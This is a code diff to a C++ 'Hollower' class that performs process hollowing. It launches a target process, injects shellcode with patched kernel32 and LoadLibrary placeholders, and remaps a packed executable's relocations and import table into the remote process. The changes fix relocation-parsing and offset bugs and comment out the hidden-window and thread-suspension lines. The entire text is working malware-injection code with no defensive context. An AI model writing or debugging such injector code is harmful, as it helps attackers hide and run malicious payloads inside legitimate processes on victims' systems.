@@ -120,7 +120,7 @@ void Hollower::InjectBootstrapper(size_t IATInfoOffset)
 		(size_t)this->IATshellcodeSize,
 		std::map<DWORD, DWORD>({
 								{ SECTION_BASE_PLACEHOLDER, (DWORD)this->remoteCodeBase },
-								{ IAT_LOCATION_PLACEHOLDER, (DWORD)this->remoteCodeBase + (DWORD)this->packedPEData->GetIAT().offset},
+								{ IAT_LOCATION_PLACEHOLDER, (DWORD)this->remoteCodeBase + (DWORD)this->packedPEData->GetIAT().offset + (DWORD)this->imageOffset},
 								{ CONTAINS_STRING_PLACEHOLDER, (DWORD)this->remoteCodeBase + IATInfoOffset },
 								{ KERNEL32_PLACEHOLDER, (DWORD)this->remoteCodeBase + (kernel32Str - (int)this->localCodeSectionBase) },
 								{ LOADLIBRARY_PLACEHOLDER,(DWORD)this->remoteCodeBase + (loadlibraryStr - (int)this->localCodeSectionBase)},
@@ -142,6 +142,8 @@ void Hollower::InjectBootstrapper(size_t IATInfoOffset)
 
 void Hollower::FixRelocations()
 {
+	if (((int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)== 0)
+		return;
 	IMAGE_BASE_RELOCATION* relocationDirectory = (IMAGE_BASE_RELOCATION*)((int)this->localCodeSectionBase + (int)this->imageOffset + (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 	int relocationSize = (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
 	int relPos = 0;
@@ -149,14 +151,18 @@ void Hollower::FixRelocations()
 	while (relPos < relocationSize)
 	{
 		DWORD majorOffset = ((IMAGE_BASE_RELOCATION*)((int)relocationDirectory + relPos))->VirtualAddress;
-		size_t blockSize = (DWORD)relocationDirectory->SizeOfBlock;
-		DWORD block = (DWORD)((DWORD*)relocationDirectory+2);
-		for (size_t i = relPos; i <= blockSize / 4; i++)
+		size_t blockSize = (DWORD)((IMAGE_BASE_RELOCATION*)((int)relocationDirectory + relPos))->SizeOfBlock;
+	
+		DWORD block = (DWORD)((int)relocationDirectory + relPos)+8;
+		while(*(WORD*)block!=0)
 		{
-			BYTE minorOffset = *(BYTE*)block;
+			WORD minorOffset = (*(WORD*)block & 0xfff);
 
 			void* addrToBePatched = (IMAGE_BASE_RELOCATION*)((int)this->localCodeSectionBase + (int)this->imageOffset + majorOffset + minorOffset);
-			*(DWORD*)addrToBePatched = (DWORD)(((*(int*)addrToBePatched) - (int)this->packedPEData->GetOptionalHeader()->ImageBase) + (int)this->remoteCodeBase);
+			*(DWORD*)addrToBePatched = (DWORD)(((*(int*)addrToBePatched)
+				- (int)this->packedPEData->GetOptionalHeader()->ImageBase)
+				+ (int)this->remoteCodeBase) 
+				+ (int)this->imageOffset;
 			block+=2;
 		}
 		relPos += blockSize;
@@ -239,8 +245,8 @@ HANDLE Hollower::DoHollow()
 
 	SwapMemory();
 
-	if (!riscySupportedProcess)
-		ResumeThread(this->hRemoteThread);
+//	if (!riscySupportedProcess)
+//		ResumeThread(this->hRemoteThread);
 	return this->hRemoteProc;
 }
 
@@ -256,11 +262,11 @@ bool Hollower::StartRemoteProcess()
 	
 	std::copy(hollowedProcPath.begin(), hollowedProcPath.end(), app);
 	
-	si.dwFlags = STARTF_USESHOWWINDOW;
-	si.wShowWindow = false;
+//	si.dwFlags = STARTF_USESHOWWINDOW;
+//	si.wShowWindow = false;
 	CreateProcess(app, NULL , NULL, NULL, false, 0, NULL, NULL, &si, &pi);
-	if (!riscySupportedProcess)
-		SuspendThread(pi.hProcess);
+	//if (!riscySupportedProcess)
+	//	SuspendThread(pi.hProcess);
 	this->hRemoteProc = pi.hProcess;
 	this->hRemoteThread = pi.hThread;
 
